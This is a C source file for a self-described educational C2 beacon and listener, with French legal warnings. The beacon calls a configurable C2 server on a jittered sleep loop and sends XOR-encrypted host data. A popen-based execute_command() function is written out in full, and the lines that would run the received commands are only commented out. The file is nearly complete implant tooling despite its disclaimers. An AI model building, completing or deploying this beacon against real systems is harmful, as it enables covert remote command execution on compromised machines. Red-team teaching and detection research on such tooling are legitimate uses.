// EDUCATIONAL ONLY - Simple C2 Beacon Demonstration
// AVERTISSEMENT LEGAL MAXIMAL : Usage C2 malveillant = CRIME FEDERAL
// Code volontairement incomplet et non-fonctionnel pour usage malveillant

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define sleep(x) Sleep((x) * 1000)
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif

#define MAX_COMMAND_SIZE 4096
#define MAX_OUTPUT_SIZE (64 * 1024)

// Configuration beacon
typedef struct {
    char c2_server[256];
    int c2_port;
    int sleep_time;      // Seconds between callbacks
    int jitter;          // Randomization percentage (0-100)
    int max_retries;
    char encryption_key[32];
} BeaconConfig;

// Simple XOR encryption (demo uniquement)
void xor_encrypt_decrypt(unsigned char* data, size_t len, const char* key, size_t key_len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Calculer sleep avec jitter
int calculate_jitter_sleep(BeaconConfig* config) {
    if (config->jitter == 0) {
        return config->sleep_time;
    }

    int jitter_range = (config->sleep_time * config->jitter) / 100;
    int jitter_value = (rand() % (2 * jitter_range + 1)) - jitter_range;

    int sleep_with_jitter = config->sleep_time + jitter_value;

    // Minimum 1 second
    return (sleep_with_jitter < 1) ? 1 : sleep_with_jitter;
}

// Executer commande et capturer output
int execute_command(const char* command, char* output, size_t output_size) {
    printf("[*] Executing command: %s\n", command);

    FILE* pipe = popen(command, "r");
    if (!pipe) {
        snprintf(output, output_size, "[!] Failed to execute command\n");
        return -1;
    }

    size_t total_read = 0;
    while (fgets(output + total_read, output_size - total_read, pipe) != NULL) {
        total_read = strlen(output);
        if (total_read >= output_size - 1) break;
    }

    int status = pclose(pipe);
    return status;
}

// Envoyer beacon vers C2
int send_beacon(BeaconConfig* config, const char* data, size_t data_len, char* response, size_t response_size) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("[!] Socket creation failed\n");
        return -1;
    }

    // Timeout connexion
    struct timeval timeout;
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

    struct sockaddr_in server_addr = {0};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(config->c2_port);
    inet_pton(AF_INET, config->c2_server, &server_addr.sin_addr);

    printf("[*] Connecting to C2 server %s:%d...\n", config->c2_server, config->c2_port);

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        printf("[!] Connection to C2 failed\n");
        close(sock);
        return -1;
    }

    printf("[+] Connected to C2 server\n");

    // Chiffrer data (demo XOR simple)
    unsigned char* encrypted = malloc(data_len);
    memcpy(encrypted, data, data_len);
    xor_encrypt_decrypt(encrypted, data_len, config->encryption_key, strlen(config->encryption_key));

    // Envoyer beacon
    send(sock, encrypted, data_len, 0);
    printf("[*] Beacon sent (%zu bytes)\n", data_len);

    // Recevoir commande
    int received = recv(sock, response, response_size - 1, 0);
    if (received > 0) {
        response[received] = '\0';

        // Dechiffrer commande
        xor_encrypt_decrypt((unsigned char*)response, received,
                           config->encryption_key, strlen(config->encryption_key));

        printf("[*] Received command (%d bytes)\n", received);
    } else {
        response[0] = '\0';
    }

    free(encrypted);
    close(sock);
    return 0;
}

// Boucle principale beacon
void beacon_loop(BeaconConfig* config) {
    printf("\n[*] Starting beacon loop\n");
    printf("[*] C2 Server: %s:%d\n", config->c2_server, config->c2_port);
    printf("[*] Sleep: %d seconds (jitter: %d%%)\n", config->sleep_time, config->jitter);
    printf("\n[!] DEMO MODE: Beacon will NOT perform malicious actions\n\n");

    int retry_count = 0;

    while (1) {
        // Preparer beacon data (hostname, user, etc.)
        char beacon_data[1024];
        snprintf(beacon_data, sizeof(beacon_data),
                "BEACON|hostname=%s|user=%s|pid=%d",
                "DEMO_HOST", "DEMO_USER", getpid());

        // Envoyer beacon
        char response[MAX_COMMAND_SIZE];
        int result = send_beacon(config, beacon_data, strlen(beacon_data),
                                response, sizeof(response));

        if (result == 0) {
            retry_count = 0;

            // Traiter commande reçue
            if (strlen(response) > 0) {
                printf("[+] Command received: %s\n", response);

                // DEMO: Ne pas executer reellement commandes malveillantes
                if (strcmp(response, "exit") == 0) {
                    printf("[*] Exit command received\n");
                    break;
                } else if (strcmp(response, "noop") == 0) {
                    printf("[*] No operation\n");
                } else {
                    printf("[!] DEMO MODE: Would execute command: %s\n", response);
                    printf("[!] In real beacon, this would run: execute_command()\n");

                    // En production (ILLEGAL sans autorisation):
                    // char output[MAX_OUTPUT_SIZE];
                    // execute_command(response, output, sizeof(output));
                    // send_beacon(config, output, strlen(output), response, sizeof(response));
                }
            }
        } else {
            retry_count++;
            printf("[!] Beacon failed (retry %d/%d)\n", retry_count, config->max_retries);

            if (retry_count >= config->max_retries) {
                printf("[!] Max retries reached, exiting\n");
                break;
            }
        }

        // Sleep avec jitter
        int sleep_duration = calculate_jitter_sleep(config);
        printf("[*] Sleeping %d seconds...\n\n", sleep_duration);
        sleep(sleep_duration);
    }

    printf("[*] Beacon terminated\n");
}

// Listener C2 simple (demo serveur)
void c2_listener(int port) {
    printf("[*] Starting C2 listener on port %d\n", port);

    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("socket");
        return;
    }

    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in server_addr = {0};
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);

    if (bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        close(server_sock);
        return;
    }

    if (listen(server_sock, 5) < 0) {
        perror("listen");
        close(server_sock);
        return;
    }

    printf("[+] C2 listener ready\n");
    printf("[*] Waiting for beacons...\n\n");

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);

        int client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &client_len);
        if (client_sock < 0) {
            perror("accept");
            continue;
        }

        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
        printf("[+] Beacon connected from %s:%d\n", client_ip, ntohs(client_addr.sin_port));

        // Recevoir beacon data
        char buffer[MAX_COMMAND_SIZE];
        int received = recv(client_sock, buffer, sizeof(buffer) - 1, 0);

        if (received > 0) {
            buffer[received] = '\0';

            // Dechiffrer beacon (XOR demo)
            xor_encrypt_decrypt((unsigned char*)buffer, received, "demo_key", 8);

            printf("[*] Beacon data: %s\n", buffer);

            // Envoyer commande (demo: noop)
            char command[] = "noop";
            xor_encrypt_decrypt((unsigned char*)command, strlen(command), "demo_key", 8);
            send(client_sock, command, strlen(command), 0);

            printf("[*] Command sent: noop\n");
        }

        close(client_sock);
        printf("\n");
    }

    close(server_sock);
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("  Simple C2 Framework Demo\n");
    printf("========================================\n");
    printf("AVERTISSEMENT LEGAL MAXIMAL:\n");
    printf("  C2 usage malveillant = CRIME FEDERAL\n");
    printf("  Code educatif red team/blue team UNIQUEMENT\n");
    printf("  NE JAMAIS utiliser sans autorisation legale\n");
    printf("========================================\n\n");

    srand(time(NULL));

#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

    if (argc < 2) {
        printf("Usage:\n");
        printf("  Beacon:   %s beacon <c2_ip> <c2_port> [sleep] [jitter]\n", argv[0]);
        printf("  Listener: %s listener <port>\n", argv[0]);
        printf("\nExample:\n");
        printf("  %s listener 8080\n", argv[0]);
        printf("  %s beacon 127.0.0.1 8080 5 20\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "listener") == 0 && argc >= 3) {
        int port = atoi(argv[2]);
        c2_listener(port);
    } else if (strcmp(argv[1], "beacon") == 0 && argc >= 4) {
        BeaconConfig config = {0};
        strncpy(config.c2_server, argv[2], sizeof(config.c2_server) - 1);
        config.c2_port = atoi(argv[3]);
        config.sleep_time = (argc > 4) ? atoi(argv[4]) : 5;
        config.jitter = (argc > 5) ? atoi(argv[5]) : 20;
        config.max_retries = 3;
        strncpy(config.encryption_key, "demo_key", sizeof(config.encryption_key));

        beacon_loop(&config);
    } else {
        printf("[!] Invalid arguments\n");
        return 1;
    }

#ifdef _WIN32
    WSACleanup();
#endif

    return 0;
}
